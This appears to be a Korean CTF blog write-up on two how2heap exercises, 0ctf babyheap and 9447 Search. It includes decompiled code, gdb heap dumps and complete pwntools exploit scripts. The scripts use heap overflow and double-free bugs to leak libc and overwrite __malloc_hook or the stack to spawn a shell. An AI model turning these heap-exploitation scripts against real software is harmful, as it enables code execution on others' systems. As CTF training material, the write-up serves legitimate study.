@@ -1,0 +1,625 @@
+---
+title: How2Heap Prob
+date: 2019-02-19
+---
+
+How2Heap 에서 추천하는 문제들을 풀고 있는데 (귀찮아서 안하고 있음 사실..) HITCON Training 처럼 지속적으로 업데이트 예정이다! 
+
+# 0ctfbabyheap
+
+how2heap 분류에는 fastbin_dup_into_stack이라 되어 있는데 그냥 fastbin attack 인 것 같다. stack 익스할 건덕지가 안보임..
+
+```c
+void __fastcall sub_D48(__int64 a1)
+{
+  signed int i; // [rsp+10h] [rbp-10h]
+  signed int v2; // [rsp+14h] [rbp-Ch]
+  void *v3; // [rsp+18h] [rbp-8h]
+
+  for ( i = 0; i <= 15; ++i )
+  {
+    if ( !*(_DWORD *)(24LL * i + a1) )
+    {
+      printf("Size: ");
+      v2 = select_number();
+      if ( v2 > 0 )
+      {
+        if ( v2 > 4096 )
+          v2 = 4096;
+        v3 = calloc(v2, 1uLL);
+        if ( !v3 )
+          exit(-1);
+        *(_DWORD *)(24LL * i + a1) = 1;
+        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
+        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
+        printf("Allocate Index %d\n", (unsigned int)i);
+      }
+      return;
+    }
+  }
+}
+```
+
+calloc 을 사용하고 특이한건 할당한 chunk에 대한 정보를 버퍼링 함수 안에서 따로 mmap으로 매핑하여 거기서 등록하고 사용한다. 
+
+```c
+__int64 __fastcall input_data_chunk(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+18h] [rbp-8h]
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = select_number();
+  v2 = result;
+  if ( (signed int)result >= 0 && (signed int)result <= 15 )
+  {
+    result = *(unsigned int *)(24LL * (signed int)result + a1);
+    if ( (_DWORD)result == 1 )
+    {
+      printf("Size: ");
+      result = select_number();
+      v3 = result;
+      if ( (signed int)result > 0 )
+      {
+        printf("Content: ");
+        result = read_(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
+      }
+    }
+  }
+  return result;
+}
+```
+
+할당한 chunk에 데이터를 넣을 수 있는데 일단 오버플로우가 나고 매핑된 영역에 flag가 없으면 사용할 수 없다.
+
+```c
+signed int __fastcall print_chunk(__int64 a1)
+{
+  signed int result; // eax
+  signed int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = select_number();
+  v2 = result;
+  if ( result >= 0 && result <= 15 )
+  {
+    result = *(_DWORD *)(24LL * result + a1);
+    if ( result == 1 )
+    {
+      puts("Content: ");
+      print_sub(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
+      result = puts(byte_14F1);
+    }
+  }
+  return result;
+}
+```
+
+free는 기본적이라 생략하고 이녀석도 역시 mapped된 영역의 정보를 가지고 출력을 해준다. 주소+할당할 때 size만큼 write로 출력한다. 
+
+익스자체는 간단한데 문제는 leak이다. free시에 chunk 포인터가 비워지기 때문에 간단하게는 leak을 할 수가 없다. 할당되는 포인터를 free된 small bin chunk를 가리키도록 해야 한다.
+
+```c
+add(0xf0)
+add(0x10)
+add(0xf0)
+add(0x20)
+
+gdb-peda$ par
+addr                prev                size                 status              fd                bk                
+0x55d233da8000      0x0                 0x100                Used                None              None
+0x55d233da8100      0x0                 0x20                 Used                None              None
+0x55d233da8120      0x0                 0x100                Used                None              None
+0x55d233da8220      0x0                 0x30                 Used                None              None
+```
+
+일단 이런식으로 할당을 해보자
+
+```c
+gdb-peda$ 
+0x155f6bff2100:	0x0000000000000001	0x00000000000000f0
+0x155f6bff2110:	0x000055d233da8010	0x0000000000000001
+0x155f6bff2120:	0x0000000000000010	0x000055d233da8110
+0x155f6bff2130:	0x0000000000000001	0x00000000000000f0
+0x155f6bff2140:	0x000055d233da8130	0x0000000000000001
+0x155f6bff2150:	0x0000000000000020	0x000055d233da8230
+```
+
+포인터가 설정되어있는데 1 chunk 는 110 을 할당받은 상태다
+
+```c
+gdb-peda$ par
+addr                prev                size                 status              fd                bk                
+0x5596e0b4d000      0x0                 0x100                Freed     0x7f84f4db9b78    0x7f84f4db9b78
+0x5596e0b4d100      0x100               0x20                 Used                None              None
+0x5596e0b4d120      0x0                 0x100                Used                None              None
+0x5596e0b4d220      0x0                 0x30                 Used                None              None
+
+0x41b30777d2a0:	0x0000000000000001	0x0000000000000010
+0x41b30777d2b0:	0x00005596e0b4d110	0x0000000000000000
+0x41b30777d2c0:	0x0000000000000000	0x0000000000000000
+0x41b30777d2d0:	0x0000000000000001	0x00000000000000f0
+0x41b30777d2e0:	0x00005596e0b4d130	0x0000000000000001
+0x41b30777d2f0:	0x0000000000000020	0x00005596e0b4d230
+```
+
+free(1) -> free(0) -> add(0x10) 중간에 더미 fast chunk먼저 해제 하고 small bin 해제 후 다시 fast chunk를 재할당 해보자 0 chunk 가 fast chunk를 반환받았다.
+
+```c
+gdb-peda$ par
+addr                prev                size                 status              fd                bk                
+0x55cb39176000      0x0                 0x220                Freed     0x7f39f36e6b78    0x7f39f36e6b78
+0x55cb39176220      0x220               0x30                 Used                None              None
+```
+
+그리고 fill 메뉴로 0 chunk 에서 오버플로우를 내 2 chunk 의 prev size와 size를 변조한 후 2 chunk를 free하면 chunk가 병합되게 된다.
+
+```c
+gdb-peda$ par
+addr                prev                size                 status              fd                bk                
+0x55aea9d94000      0x0                 0x100                Used                None              None
+0x55aea9d94100      0x0                 0x120                Freed     0x7f6e92846b78    0x7f6e92846b78
+0x55aea9d94220      0x120               0x30                 Used                None              None
+
+gdb-peda$ 
+0x32f2de63c100:	0x0000000000000000	0x0000000000000000
+0x32f2de63c110:	0x0000000000000000	0x0000000000000000
+0x32f2de63c120:	0x0000000000000000	0x0000000000000000
+0x32f2de63c130:	0x0000000000000000	0x0000000000000000
+0x32f2de63c140:	0x0000000000000000	0x0000000000000000
+0x32f2de63c150:	0x0000000000000000	0x0000000000000000
+0x32f2de63c160:	0x0000000000000001	0x0000000000000010
+0x32f2de63c170:	0x000055aea9d94110	0x0000000000000001
+0x32f2de63c180:	0x00000000000000f0	0x000055aea9d94010
+0x32f2de63c190:	0x0000000000000000	0x0000000000000000
+0x32f2de63c1a0:	0x0000000000000000	0x0000000000000001
+0x32f2de63c1b0:	0x0000000000000020	0x000055aea9d94230
+```
+
+그리고 0xf0 만큼 다시 할당하면 포인터 아다리가 잘 맞게 된다. 0 chunk와 1 chunk가 바뀌었지만 0 chunk에 main.arena.top이 있기에 dump(0)을 해주면 leak이 가능하다.
+
+```python
+from pwn import *
+
+t = process('./0ctfbabyheap')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def add(a):
+	r("Command: ")
+	s("1")
+	r("Size: ")
+	s(str(a))
+
+def fill(a,b,c):
+	r("Command: ")
+	s("2")
+	r("Index: ")
+	s(str(a))
+	r("Size: ")
+	s(str(b))
+	r("Content: ")
+	s(str(c))
+
+def free(a):
+	r("Command: ")
+	s("3")
+	r("Index: ")
+	s(str(a))
+
+def dump(a):
+	r("Command: ")
+	s("4")
+	r("Index: ")
+	s(str(a))
+
+add(0xf0)
+add(0x10)
+add(0xf0)
+add(0x20)
+free(1)
+free(0)
+add(0x10)
+fill(0,0x20,p64(0)*2 + p64(0x120) + p64(0x100))
+free(2)
+add(0xf0)
+dump(0)
+r("Content: \n")
+libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
+log.info("libc ==> " + hex(libc))
+one = libc + 0x4526a
+malloc_hook = libc + 0x3c4b10
+
+add(0x110)
+add(0x60) #4
+add(0x60) #5
+
+free(5)
+free(4)
+add(0x60)
+fill(4,0x78,"\x00"*0x68 + p64(0x71) + p64(malloc_hook-35))
+add(0x60)
+add(0x60)
+fill(6,35,"\x00"*3 + p64(one)*4)
+
+r("Command: ")
+s(1)
+r("Size: ")
+s(10)
+pause()
+
+t.interactive()
+->
+bskim@bstime:~$ python babyheap2.py 
+[+] Starting local process './0ctfbabyheap': pid 8663
+[*] libc ==> 0x7fb39d994000
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+$ id
+uid=1000(bskim) gid=1000(bskim)
+```
+
+leak만 되면 다음은 기본 fastbin attack이다. 
+
+<br>
+
+# 9447-Search
+
+하 리버싱이 너무 딸려서 갱장히 어려웠다..
+
+2가지 메뉴 밖에 없다. 단어 찾기, 단어 넣기 (글자?)
+
+```c
+void sub_400AD0()
+{
+  int v0; // ebp
+  void *v1; // r12
+  __int64 i; // rbx
+  char v3; // [rsp+0h] [rbp-38h]
+
+  puts("Enter the word size:");
+  v0 = input_num();
+  if ( (unsigned int)(v0 - 1) > 0xFFFD )
+    puts_exit("Invalid size");
+  puts("Enter the word:");
+  v1 = malloc(v0);
+  fread_((__int64)v1, v0, 0);
+  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )
+  {
+    if ( **(_BYTE **)(i + 16) )
+    {
+      if ( *(_DWORD *)(i + 8) == v0 && !memcmp(*(const void **)i, v1, v0) )
+      {
+        __printf_chk(1LL, "Found %d: ", *(unsigned int *)(i + 24));
+        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);
+        putchar(10);
+        puts("Delete this sentence (y/n)?");
+        fread_((__int64)&v3, 2, 1);
+        if ( v3 == 121 )
+        {
+          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));
+          free(*(void **)(i + 16));
+          puts("Deleted!");
+        }
+      }
+    }
+  }
+  free(v1);
+}
+```
+
+이게 단어를 찾아서 free 시켜 버린다. 더블 프리가 발생함!
+
+```c
+int sub_400C00()
+{
+  int v0; // eax
+  __int64 v1; // rbp
+  int v2; // er13
+  char *v3; // r12
+  signed __int64 v4; // rbx
+  signed __int64 v5; // rbp
+  _DWORD *v6; // rax
+  int v7; // edx
+  __int64 v8; // rdx
+  __int64 v10; // rdx
+
+  puts("Enter the sentence size:");
+  v0 = input_num();
+  v1 = (unsigned int)(v0 - 1);
+  v2 = v0;
+  if ( (unsigned int)v1 > 0xFFFD )
+    puts_exit("Invalid size");
+  puts("Enter the sentence:");
+  v3 = (char *)malloc(v2);
+  fread_((__int64)v3, v2, 0);
+  v4 = (signed __int64)(v3 + 1);
+  v5 = (signed __int64)&v3[v1 + 2];
+  v6 = malloc(0x28uLL);
+  v7 = 0;
+  *(_QWORD *)v6 = v3;
+  v6[2] = 0;
+  *((_QWORD *)v6 + 2) = v3;
+  v6[6] = v2;
+  do
+  {
+    while ( *(_BYTE *)(v4 - 1) != 32 )
+    {
+      v6[2] = ++v7;
+LABEL_4:
+      if ( ++v4 == v5 )
+        goto LABEL_8;
+    }
+    if ( v7 )
+    {
+      v10 = qword_6020B8;
+      qword_6020B8 = (__int64)v6;
+      *((_QWORD *)v6 + 4) = v10;
+      v6 = malloc(0x28uLL);
+      v7 = 0;
+      *(_QWORD *)v6 = v4;
+      v6[2] = 0;
+      *((_QWORD *)v6 + 2) = v3;
+      v6[6] = v2;
+      goto LABEL_4;
+    }
+    *(_QWORD *)v6 = v4++;
+  }
+  while ( v4 != v5 );
+LABEL_8:
+  if ( v7 )
+  {
+    v8 = qword_6020B8;
+    qword_6020B8 = (__int64)v6;
+    *((_QWORD *)v6 + 4) = v8;
+  }
+  else
+  {
+    free(v6);
+  }
+  return puts("Added sentence");
+}
+```
+
+이게 문장을 넣어 주는 건데 자세하게 분석은 못했다. 포인터들이 엄청나게 생기는데 크게 중요하지 않았다.
+
+으.. 이건 leak 하기가 되게 어려웠다 ㅠ
+
+분명 fwrite 를 이용해서 릭을 해야 할텐데... 출력되는 포인터는 지워지지 않기 때문에 가능하다 생각하고 계속 해봤지만 한 문자로 꽉채워서 그 문자로만 free 시키고 찾으면 그 녀석만 나왔다.(찾는 녀석도 chunk에 할당 되기 때문에.. free할 시 0으로 다 채워버리는데 거기에 고대로 들어가게 되어버린다.) 근데 문장을 삽입하는 코드에 0x20으로 뭔가 짜르는 것 같아서 뭔가 계속 넣어봤는데
+
+```
+bskim@bsbuntu:~/2019/how2heap$ ./search
+1: Search with a word
+2: Index a sentence
+3: Quit
+2
+Enter the sentence size:
+3
+Enter the sentence:
+a b
+Added sentence
+1: Search with a word
+2: Index a sentence
+3: Quit
+1
+Enter the word size:
+1
+Enter the word:
+a
+Found 3: a b
+
+Enter the word size:
+1
+Enter the word:
+b
+Found 3: a b
+```
+
+중간에 0x20을 넣어주면 이렇게 검색이 되더라 대충 중간에 더미 문자 하나 끼워서 그걸 다시 찾으면 출력이 될것 같다. (smallbin에 다시 재할당 되지 않도록 작은 녀석이어야 한다.)
+
+```python
+from pwn import *
+
+t = process('./search')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def sw(size,a):
+	r("3: Quit")
+	s("1")
+	r(":")
+	s(str(size))
+	r(":")
+	s(str(a))
+
+def sen(size,a):
+	r("3: Quit")
+	s("2")
+	r(":")
+	s(str(size))
+	r(":")
+	s(str(a))
+
+sen(0x100,"a"*0xf0 + " b " + "c"*(0x100-0xf3))
+
+sw(1,"b")
+r("?")
+s("y")
+sw(1,"\x00")
+
+r("Found 256: ")
+libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
+log.success("libc ==> " + hex(libc))
+malloc_hook = libc + 0x3c4b10
+one = libc + 0xf02a4
+log.success("one ==> " + hex(one))
+r("?")
+s("n")
+
+sen(0x100,"a"*0x100)
+sen(0x10,"y"*0x10)
+sen(0x60,"d"*0x20 + " b " + "c"*(0x60-0x23))
+sen(0x60,"d"*0x20 + " b " + "c"*(0x60-0x23))
+sen(0x60,"d"*0x20 + " b " + "c"*(0x60-0x23))
+
+sw(1,"b")
+r("?")
+s("y")
+r("?")
+s("y")
+r("?")
+s("y")
+
+sw(1,"\x00")
+r("?")
+s("y")
+r("?")
+s("n")
+
+sen(0x60,p64(malloc_hook-35) + "p"*(0x60-8))
+sen(0x60,"a"*0x60)
+sen(0x60,"a"*0x60)
+sen(0x60,"a"*3 + p64(one)*4 + "c"*(0x60 - 35))
+
+t.interactive()
+```
+
+익스 코드 
+
+leak은 몇 시간동안 삽질하다가 겨우 되었다.. b를 지우고나서 다시 뭐로 찾아야 저게 나오나 했는데 null이었음 거의 얻어걸렸다. 그 다음 더블 프리를 만들기 위해서 같은 방법으로 free를 해줘야 한다. 마지막으로 hook 덮기
+
+근데 이것도 스택을 왜 안쓰지 하고 찾아보니 실제 풀이들은 스택을 이용해서 풀었더라.. 기왕 찾아본 김에 스택으로도 풀어봤다.
+
+스택 릭은 전혀 생각도 못하고 있었는데..
+
+```c
+__int64 input_num()
+{
+  __int64 result; // rax
+  char *endptr; // [rsp+8h] [rbp-50h]
+  char nptr; // [rsp+10h] [rbp-48h]
+  unsigned __int64 v3; // [rsp+48h] [rbp-10h]
+
+  v3 = __readfsqword(0x28u);
+  fread_((__int64)&nptr, 48, 1);
+  result = strtol(&nptr, &endptr, 0);
+  if ( endptr == &nptr )
+  {
+    __printf_chk(1LL, "%s is not a valid number\n", &nptr);
+    result = input_num();
+  }
+  __readfsqword(0x28u);
+  return result;
+}
+```
+
+여기서 릭이 되어 버린다. 숫자가 아닌 문자를 넣으면 에러가 뜨면서 다시 이 녀석이 재 호출 되면서 새로운 스택 프레임이 생기게 된다.(48개를 꽉채우면 널바이트도 들어가지 않는다) 
+
+```c
+gdb-peda$ x/32gx 0x7ffc644e08e0 - 0x60
+0x7ffc644e0880:	0x6161616161616161	0x6161616161616161
+0x7ffc644e0890:	0x6161616161616161	0x6161616161616161
+0x7ffc644e08a0:	0x6161616161616161	0x6161616161616161
+0x7ffc644e08b0:	0x00007ffc644e08e0	0x59f979be216a5000
+0x7ffc644e08c0:	0x00007ffc644e08e0	0x0000000000400abb
+0x7ffc644e08d0:	0x000000000000000a	0x00007ffc644e08e0
+0x7ffc644e08e0:	0x6161616161616161	0x6161616161616161
+0x7ffc644e08f0:	0x6161616161616161	0x6161616161616161
+0x7ffc644e0900:	0x6161616161616161	0x6161616161616161
+0x7ffc644e0910:	0x0000000000000000	0x59f979be216a5000
+```
+
+왜 저 포인터가 저렇게 추가 되는지는 잘 모르겠으나.. 신기했다. 아무튼 2번의 에러를 내면 스택 릭이 된다.
+
+```python
+from pwn import *
+
+t = process('./search')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def sw(size,a):
+	r("3: Quit")
+	s("1")
+	r(":")
+	s(str(size))
+	r(":")
+	s(str(a))
+
+def sen(size,a):
+	r("3: Quit")
+	s("2")
+	r(":")
+	s(str(size))
+	r(":")
+	s(str(a))
+
+r("3: Quit")
+s("a"*48)
+r("number")
+s("a"*48)
+r("a"*48)
+stack = u64(t.recv(6).ljust(8,'\x00'))
+log.success("stack ==> " + hex(stack))
+target = stack + 0x50 # -6
+
+r("number")
+s("2")
+r(":")
+s(0x100)
+r(":")
+s("a"*0xf0 + " b " + "c"*(0x100-0xf3))
+
+sw(1,"b")
+r("?")
+s("y")
+sw(1,"\x00")
+
+r("Found 256: ")
+libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
+log.success("libc ==> " + hex(libc))
+malloc_hook = libc + 0x3c4b10
+system = libc + 0x45390
+prdi = 0x0000000000400e23
+binsh = libc + 0x18cd57
+r("?")
+s("n")
+
+sen(0x100,"a"*0x100)
+sen(0x10,"y"*0x10)
+sen(0x30,"d"*0x20 + " b " + "c"*(0x30-0x23))
+sen(0x30,"d"*0x20 + " b " + "c"*(0x30-0x23))
+sen(0x30,"d"*0x20 + " b " + "c"*(0x30-0x23))
+
+sw(1,"b")
+r("?")
+s("y")
+r("?")
+s("y")
+r("?")
+s("y")
+
+sw(1,"\x00")
+r("?")
+s("y")
+#r("?")
+#s("n")
+
+sen(0x30,p64(target-6) + "p"*(0x30-8))
+sen(0x30,"a"*0x30)
+sen(0x30,"a"*0x30)
+sen(0x30,"\x40" + "\x00"*5 + p64(0) + p64(prdi) + p64(binsh) + p64(system) + "c"*(0x30-38))
+r("3: Quit")
+s("3")
+pause()
+
+t.interactive()
+```
+
+원샷 되는게 없는 것 같다.. (아니 한달만에 문제를 풀다니..)
+
+아ㅏㅏㅏㅏ 리버싱을 잘하고 싶다... 
